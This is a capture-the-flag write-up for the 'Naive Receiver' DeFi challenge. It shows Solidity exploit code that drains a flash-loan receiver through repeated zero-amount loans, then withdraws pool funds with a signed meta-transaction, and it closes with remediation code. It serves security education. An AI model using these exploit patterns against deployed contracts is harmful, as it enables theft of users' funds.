# Challenge #2: Naive Receiver

- **Difficulty**: Easy
- **Category**: Fixed Fee Drain
- **Severity**: Critical
- **Status**: SOLVED

## Overview

A flash loan pool charges a fixed 1 ETH fee per flash loan, regardless of the borrowed amount. A separate receiver contract implements the flash loan callback but lacks access control — anyone can trigger flash loans on behalf of the receiver. Additionally, a `BasicForwarder` contract enables meta-transactions that can impersonate the deployer.

## Vulnerability

Two distinct vulnerabilities chain together:

**1. Missing Access Control on Receiver**: The `FlashLoanReceiver` contract accepts flash loan callbacks from anyone. There is no check that `msg.sender` or the initiator is an authorized party:

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
    external returns (bytes32) {
    // No check on who initiated this flash loan
    assembly { if iszero(eq(sload(pool.slot), caller())) { revert(0, 0) } }
    // Only validates the pool is calling, not WHO asked the pool
}
```

**2. Fixed Fee Economics**: The pool charges exactly 1 ETH per flash loan regardless of the amount borrowed. A zero-amount loan still costs 1 ETH. With the receiver holding 10 ETH, exactly 10 flash loans drain it completely.

**3. Meta-Transaction Forwarder**: The `BasicForwarder` allows signed meta-transactions. The deployer's signature can be used to call `withdraw()` on the pool, extracting remaining deposits.

## Exploit Walkthrough

**Step 1**: Use `pool.multicall()` to batch 10 flash loan calls in a single transaction:

```solidity
bytes[] memory calls = new bytes[](10);
for (uint256 i = 0; i < 10; i++) {
    calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(token), 0, ""));
}
pool.multicall(calls);
```

Each call borrows 0 ETH but the receiver pays 1 ETH in fees. After 10 calls, the receiver's entire 10 ETH balance is drained into the pool.

**Step 2**: Construct a meta-transaction via the `BasicForwarder` to call `withdraw()` as the deployer, extracting the pool's ETH balance:

```solidity
BasicForwarder.Request memory request = BasicForwarder.Request({
    from: deployer,
    target: address(pool),
    value: 0,
    nonce: 0,
    data: abi.encodeCall(pool.withdraw, (DEPOSIT_AMOUNT + RECEIVER_BALANCE, payable(recovery))),
    deadline: block.timestamp
});
bytes32 digest = forwarder.getDataHash(request);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, digest);
forwarder.execute(request, abi.encodePacked(r, s, v));
```

**Step 3**: All funds (pool deposits + drained receiver balance) are now in the recovery address.

## Real-World Impact

- **dYdX** flash loan fee structures have been scrutinized for similar fixed-fee economic attacks where the cost of borrowing is disproportionate to the amount.
- **Meta-transaction replay** and forwarder vulnerabilities have appeared in multiple protocols, including early **GSN (Gas Station Network)** implementations where signature validation was insufficient.
- The pattern of draining a contract by repeatedly invoking operations it cannot refuse is a common griefing vector in DeFi.

## Remediation

```solidity
// Fix 1: Proportional fees instead of fixed
uint256 fee = amount * FEE_BPS / 10000; // e.g., 0.09% of borrowed amount
require(fee >= MIN_FEE, "Fee too low"); // floor to prevent dust loans

// Fix 2: Access control on receiver
function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
    external returns (bytes32) {
    require(initiator == owner, "Unauthorized initiator");
    // ...
}

// Fix 3: Validate forwarder signatures with nonce tracking and expiry
```

## Key Takeaway

Fixed fees on flash loans create griefing vectors — always use proportional fees and enforce initiator access control on receivers.
